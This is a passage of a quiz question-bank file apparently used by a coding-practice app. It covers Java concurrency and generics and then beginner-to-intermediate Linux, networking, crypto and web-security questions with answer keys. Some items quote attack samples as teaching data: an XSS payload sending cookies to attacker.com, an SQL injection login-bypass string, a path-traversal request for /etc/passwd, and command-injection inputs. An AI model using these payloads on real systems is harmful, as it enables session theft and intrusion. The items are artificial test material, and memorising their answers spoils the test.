    explanation: "Because threads in thread pools are recycled indefinitely rather than terminated, any value stored in a thread's `ThreadLocalMap` remains strongly reachable through the thread. If not cleaned up via `ThreadLocal.remove()`, this prevents classes and classloaders from being garbage collected, causing PermGen/Metaspace memory leaks.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["concurrency", "threadlocal", "memory-leaks"]
  },
  {
    id: "java-exp-018",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "generics",
    subtopic: "bridge_methods",
    standardVersion: "Java 17",
    prompt: "Why does the Java compiler synthesize synthetic 'bridge methods' when a class implements a parameterized interface?",
    code: "public class Node implements Comparable<Node> {\n    public int compareTo(Node other) { return 0; }\n    // What does javac synthesize under the hood?\n}",
    options: [
      "A synthetic bridge method 'public int compareTo(Object other)' to preserve polymorphism after type erasure",
      "A bridge method to execute comparative logic on GPU threads",
      "A bridge method to serialize the object across network sockets",
      "A bridge method to convert comparisons into equals() calls"
    ],
    correctAnswer: "A synthetic bridge method 'public int compareTo(Object other)' to preserve polymorphism after type erasure",
    acceptedAnswers: ["A synthetic bridge method 'public int compareTo(Object other)' to preserve polymorphism after type erasure"],
    hint: "Comparable<T> erases to Comparable with compareTo(Object); the compiler must ensure polymorphic dispatch works.",
    explanation: "Due to type erasure, `Comparable<Node>` erases to raw `Comparable` with method signature `compareTo(Object)`. To preserve dynamic dispatch when invoked via a raw `Comparable` reference, the compiler synthesizes a synthetic bridge method `public int compareTo(Object o)` that casts `o` to `Node` and delegates to `compareTo(Node)`.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["generics", "bridge-methods", "bytecode"]
  },
  {
    id: "java-exp-019",
    language: "java",
    difficulty: "expert",
    type: "fill_code",
    topic: "serialization",
    subtopic: "transient_keyword",
    standardVersion: "Java 17",
    prompt: "Fill in the Java keyword used to mark an instance field so that it is excluded from default serialization.",
    code: "public class UserSession implements java.io.Serializable {\n    private String username;\n    private _________ String passwordHash;\n}",
    correctAnswer: "transient",
    acceptedAnswers: ["transient"],
    hint: "This keyword marks fields that should not be persisted or serialized.",
    explanation: "In Java serialization, fields marked with the `transient` keyword are ignored by the standard serialization mechanism (`ObjectOutputStream`), ensuring sensitive or temporary state is not written to byte streams.",
    points: 300,
    estimatedSeconds: 20,
    tags: ["serialization", "transient", "security"]
  },
  {
    id: "java-exp-020",
    language: "java",
    difficulty: "expert",
    type: "predict_output",
    topic: "concurrency",
    subtopic: "reentrant_monitor_synchronization",
    standardVersion: "Java 17",
    prompt: "What is demonstrated by a Java thread calling a synchronized method that calls another synchronized method on the same object monitor?",
    code: "public class LockDemo {\n    public synchronized void outer() {\n        System.out.print(\"Outer \");\n        inner();\n    }\n    public synchronized void inner() {\n        System.out.print(\"Inner\");\n    }\n    public static void main(String[] args) {\n        new LockDemo().outer();\n    }\n}",
    options: [
      "Outer Inner (reentrant synchronization succeeds without self-deadlock)",
      "Outer (deadlocks when trying to acquire the monitor in inner())",
      "Throws IllegalMonitorStateException",
      "Compilation error"
    ],
    correctAnswer: "Outer Inner (reentrant synchronization succeeds without self-deadlock)",
    acceptedAnswers: ["Outer Inner (reentrant synchronization succeeds without self-deadlock)"],
    hint: "Java intrinsic locks are reentrant: if the thread already owns the monitor, it can re-acquire it without blocking.",
    explanation: "Java intrinsic locks are reentrant. A thread that already holds a lock on an object monitor can enter other synchronized blocks or methods requiring the same lock without blocking. The JVM increments an acquisition counter, allowing `inner()` to execute smoothly and outputting 'Outer Inner'.",
    points: 300,
    estimatedSeconds: 40,
    tags: ["concurrency", "reentrant", "synchronization"]
  }
];

/* --- End of data/java-questions.js --- */

/* --- Start of data/cyber-questions.js --- */
/**
 * SyntaxArena Question Bank — Cybersecurity & Linux / Bash
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: Linux POSIX / Bash / OWASP Top 10 / Network Security
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var cyberQuestions = window.cyberQuestions = [
  // =========================================================================
  // CYBER BEGINNER (20 QUESTIONS: cyber-beg-001 to cyber-beg-020)
  // =========================================================================
  {
    id: "cyber-beg-001",
    language: "cyber",
    difficulty: "beginner",
    type: "predict_output",
    topic: "linux_permissions",
    subtopic: "chmod_octal",
    standardVersion: "POSIX CLI",
    prompt: "What exact permission string is produced after running `chmod 755 deploy.sh`?",
    code: "$ touch deploy.sh\n$ chmod 755 deploy.sh\n$ ls -l deploy.sh | awk '{print $1}'",
    options: ["-rwxr-xr-x", "-rwxrwxrwx", "-rw-r--r--", "-rwxr-x---"],
    correctAnswer: "-rwxr-xr-x",
    acceptedAnswers: ["-rwxr-xr-x"],
    hint: "Octal permissions represent owner (7 = 4+2+1), group (5 = 4+0+1), and others (5 = 4+0+1).",
    explanation: "In Linux octal notation, 7 is rwx (read=4, write=2, execute=1). 5 is r-x (read=4, execute=1). Applied across owner, group, and other, 755 yields `-rwxr-xr-x`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "permissions", "chmod"]
  },
  {
    id: "cyber-beg-002",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_permissions",
    subtopic: "suid_bit",
    standardVersion: "POSIX CLI",
    prompt: "What is the primary security consequence of setting the SUID bit (`chmod 4755 /bin/tool`) on an executable?",
    code: "# chmod 4755 /usr/local/bin/custom_tool\n$ ls -l /usr/local/bin/custom_tool\n-rwsr-xr-x 1 root root ...",
    options: [
      "The program executes with the privileges of the file owner (root) rather than the executing user",
      "Only the root user is allowed to execute the file",
      "The file is encrypted in memory during execution",
      "The program runs in a sandboxed, unprivileged subshell"
    ],
    correctAnswer: "The program executes with the privileges of the file owner (root) rather than the executing user",
    acceptedAnswers: ["The program executes with the privileges of the file owner (root) rather than the executing user"],
    hint: "SUID stands for 'Set User ID'. Notice the 's' in the owner execution slot.",
    explanation: "The SUID (Set User ID) permission bit causes an executable to run with the effective UID of the file owner (commonly root), which is a common vector for privilege escalation if flawed.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "suid", "privilege_escalation"]
  },
  {
    id: "cyber-beg-003",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "standard_ports",
    standardVersion: "IANA Standard",
    prompt: "What is the standard, default TCP port assigned for secure remote administration via OpenSSH?",
    code: "$ ssh admin@192.168.1.50\nConnecting to 192.168.1.50:???...",
    options: ["22", "21", "23", "80"],
    correctAnswer: "22",
    acceptedAnswers: ["22"],
    hint: "Port 21 is FTP, 23 is Telnet, and 80 is unencrypted HTTP.",
    explanation: "TCP Port 22 is the standard IANA assigned port for the Secure Shell (SSH) protocol, replacing legacy unencrypted Telnet (port 23).",
    points: 100,
    estimatedSeconds: 30,
    tags: ["networking", "ports", "ssh"]
  },
  {
    id: "cyber-beg-004",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "dns_port",
    standardVersion: "IANA Standard",
    prompt: "Which default transport port does the Domain Name System (DNS) use for standard domain lookups?",
    code: "$ dig @8.8.8.8 example.com",
    options: ["53", "25", "443", "8080"],
    correctAnswer: "53",
    acceptedAnswers: ["53"],
    hint: "Standard DNS queries operate over UDP and TCP port 53. Port 25 is SMTP, 443 is HTTPS.",
    explanation: "DNS operates on port 53, primarily over UDP for quick lightweight queries, and falling back to TCP for responses larger than 512 bytes or zone transfers.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["networking", "dns", "ports"]
  },
  {
    id: "cyber-beg-005",
    language: "cyber",
    difficulty: "beginner",
    type: "predict_output",
    topic: "bash_redirection",
    subtopic: "append_vs_overwrite",
    standardVersion: "POSIX Shell",
    prompt: "What is the final content of output.txt after executing these redirection operators?",
    code: "echo 'alpha' > output.txt\necho 'beta' >> output.txt\necho 'gamma' > output.txt\ncat output.txt",
    options: ["gamma", "alpha\\nbeta\\ngamma", "alpha\\ngamma", "beta\\ngamma"],
    correctAnswer: "gamma",
    acceptedAnswers: ["gamma"],
    hint: "The single `>` operator overwrites or truncates the file, while `>>` appends to it.",
    explanation: "The first line writes 'alpha'. The second appends 'beta'. But the third line uses `>` which truncates output.txt before writing 'gamma'. Thus only 'gamma' remains.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["bash", "redirection", "shell"]
  },
  {
    id: "cyber-beg-006",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "bash_redirection",
    subtopic: "stderr_merging",
    standardVersion: "POSIX Shell",
    prompt: "What does the shell idiom `2>&1` accomplish in a command like `cmd > log.txt 2>&1`?",
    code: "$ ./backup_service.sh > backup.log 2>&1",
    options: [
      "Redirects Standard Error (file descriptor 2) to the same stream as Standard Output (file descriptor 1)",
      "Multiplies the file descriptor by 2 to accelerate file writing",
      "Redirects stdout to background job number 2",
      "Suppresses error messages completely by routing them to /dev/null"
    ],
    correctAnswer: "Redirects Standard Error (file descriptor 2) to the same stream as Standard Output (file descriptor 1)",
    acceptedAnswers: ["Redirects Standard Error (file descriptor 2) to the same stream as Standard Output (file descriptor 1)"],
    hint: "In Unix, file descriptor 1 is stdout and descriptor 2 is stderr.",
    explanation: "`2>&1` directs file descriptor 2 (stderr) to whatever file descriptor 1 (stdout) currently points to. This ensures both standard output and error messages are written into backup.log.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["bash", "io", "redirection"]
  },
  {
    id: "cyber-beg-007",
    language: "cyber",
    difficulty: "beginner",
    type: "predict_output",
    topic: "bash_scripting",
    subtopic: "exit_status",
    standardVersion: "POSIX Shell",
    prompt: "What is printed by echo $? after a successfully executed command in POSIX Bash?",
    code: "ls / > /dev/null\necho $?",
    options: ["0", "1", "-1", "true"],
    correctAnswer: "0",
    acceptedAnswers: ["0"],
    hint: "In Unix exit status conventions, 0 indicates clean success without error.",
    explanation: "The special variable `$?` stores the exit status of the most recently executed foreground command. In Unix, 0 indicates success, while non-zero values (1-255) signal errors.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["bash", "exit_codes"]
  },
  {
    id: "cyber-beg-008",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_process",
    subtopic: "kill_signals",
    standardVersion: "POSIX Standards",
    prompt: "Why can the signal sent by `kill -9 <PID>` (SIGKILL) not be caught or ignored by a target process?",
    code: "$ kill -9 4120",
    options: [
      "SIGKILL is handled directly by the Linux kernel, which immediately terminates the process without notifying it",
      "The target process priority is set to maximum idle state",
      "SIGKILL sends an encrypted packet that resets the motherboard clock",
      "The shell intercepts the command and renames the process to zombie"
    ],
    correctAnswer: "SIGKILL is handled directly by the Linux kernel, which immediately terminates the process without notifying it",
    acceptedAnswers: ["SIGKILL is handled directly by the Linux kernel, which immediately terminates the process without notifying it"],
    hint: "Unlike SIGTERM (15), SIGKILL (9) cannot be intercepted with a signal handler.",
    explanation: "SIGKILL (signal 9) and SIGSTOP cannot be trapped, caught, or ignored by any process because the kernel handles them directly to guarantee termination.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "processes", "signals"]
  },
  {
    id: "cyber-beg-009",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_cli",
    subtopic: "find_suid",
    standardVersion: "GNU Coreutils",
    prompt: "Which command searches the root filesystem for files with the SUID bit enabled while silencing permission denied errors?",
    code: "$ find / -perm -4000 2>/dev/null",
    options: [
      "find / -perm -4000 2>/dev/null",
      "search --suid / -quiet",
      "grep -r 'SUID' /etc/permissions",
      "locate -suid /all"
    ],
    correctAnswer: "find / -perm -4000 2>/dev/null",
    acceptedAnswers: ["find / -perm -4000 2>/dev/null"],
    hint: "Octal 4000 represents the SUID permission bit in find.",
    explanation: "`find / -perm -4000` audits the entire filesystem for files having at least the SUID bit set, and `2>/dev/null` discards error messages from directories the current user cannot read.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "cli", "find", "security_audit"]
  },
  {
    id: "cyber-beg-010",
    language: "cyber",
    difficulty: "beginner",
    type: "predict_output",
    topic: "linux_cli",
    subtopic: "grep_filtering",
    standardVersion: "GNU Coreutils",
    prompt: "What is printed by executing this pipe sequence?",
    code: "printf 'admin\\nroot\\nuser\\nagent\\n' | grep '^a' | wc -l",
    options: ["2", "1", "3", "4"],
    correctAnswer: "2",
    acceptedAnswers: ["2"],
    hint: "The regex `^a` matches lines that begin with the character 'a'.",
    explanation: "The input contains 'admin', 'root', 'user', 'agent'. Only 'admin' and 'agent' start with 'a'. Piping those 2 lines to `wc -l` counts the lines, yielding 2.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "grep", "regex"]
  },
  {
    id: "cyber-beg-011",
    language: "cyber",
    difficulty: "beginner",
    type: "predict_output",
    topic: "cryptography",
    subtopic: "base64_encoding",
    standardVersion: "RFC 4648",
    prompt: "Is Base64 considered an encryption algorithm or an encoding scheme?",
    code: "$ echo 'admin:password123' | base64\nYWRtaW46cGFzc3dvcmQxMjMK",
    options: [
      "Encoding scheme (provides zero confidentiality without a secret key)",
      "Symmetric encryption algorithm with a 64-bit secret key",
      "Asymmetric public-key cipher",
      "Cryptographic one-way hash function"
    ],
    correctAnswer: "Encoding scheme (provides zero confidentiality without a secret key)",
    acceptedAnswers: ["Encoding scheme (provides zero confidentiality without a secret key)"],
    hint: "Base64 can be reversed by anyone without any secret key or password.",
    explanation: "Base64 is an encoding scheme designed to safely transmit binary data across text-only protocols. It provides zero confidentiality because anyone can trivially decode it.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["crypto", "encoding", "base64"]
  },
  {
    id: "cyber-beg-012",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "symmetric_vs_asymmetric",
    standardVersion: "NIST Guidelines",
    prompt: "Which pair correctly categorizes AES and RSA algorithms?",
    code: "// Algorithm Classification\nAES vs RSA",
    options: [
      "AES is symmetric (shared secret key); RSA is asymmetric (public/private keypair)",
      "AES is asymmetric; RSA is symmetric",
      "Both AES and RSA are symmetric stream ciphers",
      "Both AES and RSA are one-way cryptographic hash functions"
    ],
    correctAnswer: "AES is symmetric (shared secret key); RSA is asymmetric (public/private keypair)",
    acceptedAnswers: ["AES is symmetric (shared secret key); RSA is asymmetric (public/private keypair)"],
    hint: "AES uses the same key to encrypt and decrypt. RSA uses a mathematically linked public and private key pair.",
    explanation: "AES (Advanced Encryption Standard) is a symmetric block cipher using a single secret key. RSA is an asymmetric public-key cryptosystem using paired public and private keys.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["cryptography", "aes", "rsa"]
  },
  {
    id: "cyber-beg-013",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "hash_functions",
    standardVersion: "FIPS 180-4",
    prompt: "What is the primary defining security attribute of a cryptographic hash function like SHA-256?",
    code: "$ sha256sum message.txt\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    options: [
      "It is a one-way deterministic function computationally infeasible to invert (preimage resistance)",
      "It can be decrypted back into plain text using the sender's private key",
      "It generates a larger digest when the input file is larger",
      "It produces a randomized output for identical inputs across different machines"
    ],
    correctAnswer: "It is a one-way deterministic function computationally infeasible to invert (preimage resistance)",
    acceptedAnswers: ["It is a one-way deterministic function computationally infeasible to invert (preimage resistance)"],
    hint: "Hashes are one-way: given H(M), it is impossible to calculate M.",
    explanation: "Cryptographic hash functions produce a fixed-size digest deterministically from arbitrary inputs and exhibit pre-image resistance, second pre-image resistance, and collision resistance.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["crypto", "hashing", "sha256"]
  },
  {
    id: "cyber-beg-014",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "tcp_handshake",
    standardVersion: "RFC 793",
    prompt: "What is the exact chronological packet sequence of the standard TCP 3-way connection handshake?",
    code: "Client -------- [1] -------> Server\nClient <------- [2] -------- Server\nClient -------- [3] -------> Server",
    options: [
      "SYN -> SYN-ACK -> ACK",
      "ACK -> SYN -> SYN-ACK",
      "HELLO -> CHALLENGE -> RESPONSE",
      "CONNECT -> ACCEPT -> READY"
    ],
    correctAnswer: "SYN -> SYN-ACK -> ACK",
    acceptedAnswers: ["SYN -> SYN-ACK -> ACK"],
    hint: "The client synchronizes, the server synchronizes and acknowledges, then client acknowledges.",
    explanation: "The TCP 3-way handshake begins with client sending SYN, server replying with SYN-ACK, and client concluding with ACK to establish full-duplex communication.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["networking", "tcp", "handshake"]
  },
  {
    id: "cyber-beg-015",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "icmp_ping",
    standardVersion: "RFC 792",
    prompt: "Which Internet protocol operates the network diagnostic utility `ping`?",
    code: "$ ping -c 3 8.8.8.8\nPING 8.8.8.8: 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms",
    options: ["ICMP", "TCP", "UDP", "IGMP"],
    correctAnswer: "ICMP",
    acceptedAnswers: ["ICMP"],
    hint: "Notice the abbreviation `icmp_seq` in the ping response output.",
    explanation: "The `ping` utility uses the Internet Control Message Protocol (ICMP) Echo Request (Type 8) and Echo Reply (Type 0) packets operating directly over IP.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["networking", "icmp", "ping"]
  },
  {
    id: "cyber-beg-016",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_security",
    subtopic: "path_hijacking",
    standardVersion: "POSIX Standards",
    prompt: "Why is placing `.` (current directory) at the beginning of the root user's `$PATH` dangerous?",
    code: "export PATH=.:/usr/local/bin:/usr/bin:/bin",
    options: [
      "An unprivileged attacker can place a malicious script like `ls` in any shared directory (e.g. /tmp) that root executes inadvertently",
      "It causes the bash interpreter to crash due to recursive directory loops",
      "The system kernel disallows relative paths in environment variables",
      "It exposes the root user's bash history to remote network sniffers"
    ],
    correctAnswer: "An unprivileged attacker can place a malicious script like `ls` in any shared directory (e.g. /tmp) that root executes inadvertently",
    acceptedAnswers: ["An unprivileged attacker can place a malicious script like `ls` in any shared directory (e.g. /tmp) that root executes inadvertently"],
    hint: "When PATH searches `.` first, any executable named like a common tool in the current directory executes first.",
    explanation: "If `.` is at the start of PATH, navigating to `/tmp` and typing `ls` executes `./ls` instead of `/bin/ls`, allowing local unprivileged users to execute code as root.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "security", "path_hijacking"]
  },
  {
    id: "cyber-beg-017",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_administration",
    subtopic: "cron_syntax",
    standardVersion: "Vixie Cron",
    prompt: "What does the cron schedule `0 3 * * * /backup.sh` specify?",
    code: "0 3 * * * /usr/local/bin/backup.sh",
    options: [
      "Run /backup.sh at exactly 03:00 AM every day",
      "Run /backup.sh every 3 minutes",
      "Run /backup.sh on the 3rd day of every month",
      "Run /backup.sh every Wednesday at midnight"
    ],
    correctAnswer: "Run /backup.sh at exactly 03:00 AM every day",
    acceptedAnswers: ["Run /backup.sh at exactly 03:00 AM every day"],
    hint: "The 5 cron fields are: minute (0-59), hour (0-23), day of month (1-31), month (1-12), day of week (0-7).",
    explanation: "The fields are `minute=0`, `hour=3`, with wildcards `*` for day-of-month, month, and day-of-week, which executes the job every morning at 03:00.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "cron", "administration"]
  },
  {
    id: "cyber-beg-018",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_security",
    subtopic: "etc_shadow",
    standardVersion: "Linux FHS",
    prompt: "What is the primary difference between `/etc/passwd` and `/etc/shadow` on modern Linux systems?",
    code: "$ ls -l /etc/passwd /etc/shadow\n-rw-r--r-- 1 root root /etc/passwd\n-rw-r----- 1 root shadow /etc/shadow",
    options: [
      "/etc/passwd is world-readable containing user accounts; /etc/shadow stores hashed passwords restricted to root",
      "/etc/passwd contains encrypted passwords; /etc/shadow contains plain text passwords",
      "/etc/shadow only stores SSH public keys",
      "/etc/passwd is maintained by systemd, while /etc/shadow is generated on boot"
    ],
    correctAnswer: "/etc/passwd is world-readable containing user accounts; /etc/shadow stores hashed passwords restricted to root",
    acceptedAnswers: ["/etc/passwd is world-readable containing user accounts; /etc/shadow stores hashed passwords restricted to root"],
    hint: "Notice `/etc/passwd` has `-rw-r--r--` (world readable) whereas `/etc/shadow` has `-rw-r-----`.",
    explanation: "To prevent local users from copying password hashes for offline dictionary or rainbow table attacks, modern Linux stores password hashes in restricted `/etc/shadow` rather than world-readable `/etc/passwd`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "passwords", "security"]
  },
  {
    id: "cyber-beg-019",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "hsts_header",
    standardVersion: "RFC 6797",
    prompt: "What does the HTTP response header `Strict-Transport-Security` (HSTS) instruct the web browser to do?",
    code: "HTTP/1.1 200 OK\nStrict-Transport-Security: max-age=31536000; includeSubDomains",
    options: [
      "Force all future connections to this domain to use HTTPS instead of HTTP, protecting against SSL-stripping",
      "Disable all client-side JavaScript execution",
      "Block cross-site request forgery attacks using a secret token",
      "Restrict cookie transmission to same-origin requests"
    ],
    correctAnswer: "Force all future connections to this domain to use HTTPS instead of HTTP, protecting against SSL-stripping",
    acceptedAnswers: ["Force all future connections to this domain to use HTTPS instead of HTTP, protecting against SSL-stripping"],
    hint: "HSTS prevents man-in-the-middle attackers from downgrading HTTPS connections to plaintext HTTP.",
    explanation: "HSTS tells modern browsers to automatically rewrite any `http://` links to `https://` before sending any request, mitigating SSL-stripping and downgrade attacks.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["web_security", "http", "hsts"]
  },
  {
    id: "cyber-beg-020",
    language: "cyber",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "linux_cli",
    subtopic: "tar_compression",
    standardVersion: "POSIX CLI",
    prompt: "Which command flags for `tar` extract files from a gzip-compressed archive with verbose output?",
    code: "$ tar -xzvf bundle.tar.gz",
    options: [
      "-x (extract), -z (gzip), -v (verbose), -f (filename)",
      "-x (execute), -z (zip), -v (verify), -f (fast)",
      "-x (exclude), -z (zero), -v (validate), -f (force)",
      "-x (expand), -z (z-buffer), -v (version), -f (format)"
    ],
    correctAnswer: "-x (extract), -z (gzip), -v (verbose), -f (filename)",
    acceptedAnswers: ["-x (extract), -z (gzip), -v (verbose), -f (filename)"],
    hint: "x is extract, z invokes gunzip filter, v lists processed files, f specifies the archive file.",
    explanation: "In `tar -xzvf`: `x` stands for extract, `z` instructs tar to decompress using gzip, `v` produces verbose output, and `f` indicates the archive filename argument.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["linux", "tar", "cli"]
  },

  // =========================================================================
  // CYBER INTERMEDIATE (20 QUESTIONS: cyber-int-001 to cyber-int-020)
  // =========================================================================
  {
    id: "cyber-int-001",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "sql_injection",
    standardVersion: "OWASP Top 10",
    prompt: "Why does the input `' OR '1'='1` bypass authentication in vulnerable SQL queries like `SELECT * FROM users WHERE user='$u' AND pass='$p'`?",
    code: "// Vulnerable PHP SQL Query\n$sql = \"SELECT * FROM users WHERE user='\" . $_POST['user'] . \"' AND pass='\" . $_POST['pass'] . \"'\";",
    options: [
      "It closes the quote and injects an OR condition that always evaluates to true, bypassing the password check",
      "It forces the MySQL daemon to restart in maintenance debug mode",
      "It causes an integer overflow in the user authentication hash table",
      "It converts the SQL database schema into an unencrypted CSV dump"
    ],
    correctAnswer: "It closes the quote and injects an OR condition that always evaluates to true, bypassing the password check",
    acceptedAnswers: ["It closes the quote and injects an OR condition that always evaluates to true, bypassing the password check"],
    hint: "Notice that `'1'='1'` is an identity boolean condition that is always true in SQL logic.",
    explanation: "When `' OR '1'='1` is interpolated, the query becomes `WHERE user='' OR '1'='1' AND ...`. Because `'1'='1'` is always true, the WHERE clause succeeds and returns user records without valid credentials.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["owasp", "sqli", "web_security"]
  },
  {
    id: "cyber-int-002",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "xss_classification",
    standardVersion: "OWASP Top 10",
    prompt: "What distinguishes Stored Cross-Site Scripting (XSS) from Reflected XSS?",
    code: "// Stored vs Reflected XSS\nPayload: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    options: [
      "Stored XSS is permanently saved in the application database and served to every visitor viewing that page",
      "Reflected XSS can only execute on web servers running Node.js",
      "Stored XSS only executes when the browser is completely offline",
      "Reflected XSS permanently alters the server filesystem"
    ],
    correctAnswer: "Stored XSS is permanently saved in the application database and served to every visitor viewing that page",
    acceptedAnswers: ["Stored XSS is permanently saved in the application database and served to every visitor viewing that page"],
    hint: "Stored (Persistent) XSS is stored in the backend database (like a forum post or profile comment).",
    explanation: "Stored XSS persists within backend storage (comments, profiles) and executes whenever any user loads the affected record. Reflected XSS requires the victim to click a specially crafted malicious link containing the payload.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["owasp", "xss", "web_security"]
  },
  {
    id: "cyber-int-003",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "csrf_mitigation",
    standardVersion: "OWASP Top 10",
    prompt: "How does an Anti-CSRF Synchronizer Token effectively prevent Cross-Site Request Forgery?",
    code: "<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"d8e4f910a7c4...\">\n  <input type=\"submit\" value=\"Send Funds\">\n</form>",
    options: [
      "An attacker site cannot read the victim's secret token due to the Same-Origin Policy, making their forged requests fail validation",
      "It encrypts the entire client Ethernet packet using AES-256",
      "It disables third-party browser extensions during form submission",
      "It forces the user to solve a CAPTCHA puzzle on every HTTP request"
    ],
    correctAnswer: "An attacker site cannot read the victim's secret token due to the Same-Origin Policy, making their forged requests fail validation",
    acceptedAnswers: ["An attacker site cannot read the victim's secret token due to the Same-Origin Policy, making their forged requests fail validation"],
    hint: "The browser sends cookies automatically with cross-site requests, but an external domain cannot read secret tokens embedded in DOM HTML.",
    explanation: "Browsers automatically attach cookies to cross-origin requests, but the Same-Origin Policy prevents external sites from reading HTML to discover unique anti-CSRF tokens. Requests missing valid tokens are rejected.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["owasp", "csrf", "web_security"]
  },
  {
    id: "cyber-int-004",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "directory_traversal",
    standardVersion: "CWE-22",
    prompt: "What vulnerability exists in this file download handler: `readfile('/var/www/uploads/' . $_GET['file'])`?",
    code: "// Download handler\n$path = '/var/www/uploads/' . $_GET['file'];\nreadfile($path);",
    options: [
      "Path Traversal: An attacker can request `../../../../etc/passwd` to read arbitrary system files",
      "Buffer Overflow in the Linux VFS kernel driver",
      "Cross-Site Scripting because file names contain HTML tags",
      "Denial of Service due to recursive file locking"
    ],
    correctAnswer: "Path Traversal: An attacker can request `../../../../etc/passwd` to read arbitrary system files",
    acceptedAnswers: ["Path Traversal: An attacker can request `../../../../etc/passwd` to read arbitrary system files"],
    hint: "Dot-dot-slash `../` navigates up the directory hierarchy outside the uploads directory.",
    explanation: "Without validating or canonicalizing the input (e.g. using `basename()`), dot-dot-slash `../` sequences allow attackers to traverse out of `/var/www/uploads/` and read arbitrary files like `/etc/passwd` or `/etc/shadow`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["cwe-22", "path_traversal", "web_security"]
  },
  {
    id: "cyber-int-005",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "command_injection",
    standardVersion: "CWE-78",
    prompt: "How can an attacker exploit this backend ping endpoint: `exec('ping -c 1 ' . $ip)`?",
    code: "// Vulnerable backend code\n$target = $_GET['host'];\nsystem('ping -c 1 ' . $target);",
    options: [
      "Command Injection: Inputting `8.8.8.8; cat /etc/passwd` or `8.8.8.8 && whoami` executes arbitrary shell commands",
      "SQL Injection by passing SQL SELECT statements",
      "Memory corruption in the host network card firmware",
      "IP spoofing by falsifying the DNS resolver IP"
    ],
    correctAnswer: "Command Injection: Inputting `8.8.8.8; cat /etc/passwd` or `8.8.8.8 && whoami` executes arbitrary shell commands",
    acceptedAnswers: ["Command Injection: Inputting `8.8.8.8; cat /etc/passwd` or `8.8.8.8 && whoami` executes arbitrary shell commands"],
    hint: "Shell command chaining operators like `;`, `&&`, and `|` allow running secondary shell commands.",
    explanation: "Because input is concatenated directly into a shell string, an attacker can append command separators like `;`, `&&`, or `|` followed by arbitrary shell commands, executing them with web server privileges.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["command_injection", "cwe-78", "owasp"]
  },
  {
    id: "cyber-int-006",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "password_hashing",
    standardVersion: "NIST SP 800-63B",
    prompt: "Why is a cryptographic salt and slow key derivation function (like bcrypt or Argon2) required when storing passwords?",
    code: "$2a$12$e8Y5M6v8W1vGz... (bcrypt with cost factor 12)",
    options: [
      "Salts defeat precomputed rainbow tables; slow functions make GPU brute-force attacks computationally impractical",
      "Salts compress the password to fit into 32-bit registers",
      "Bcrypt encrypts the password symmetrically so system administrators can recover lost credentials",
      "Salts ensure passwords can only be verified when the database is connected to the internet"
    ],
    correctAnswer: "Salts defeat precomputed rainbow tables; slow functions make GPU brute-force attacks computationally impractical",
    acceptedAnswers: ["Salts defeat precomputed rainbow tables; slow functions make GPU brute-force attacks computationally impractical"],
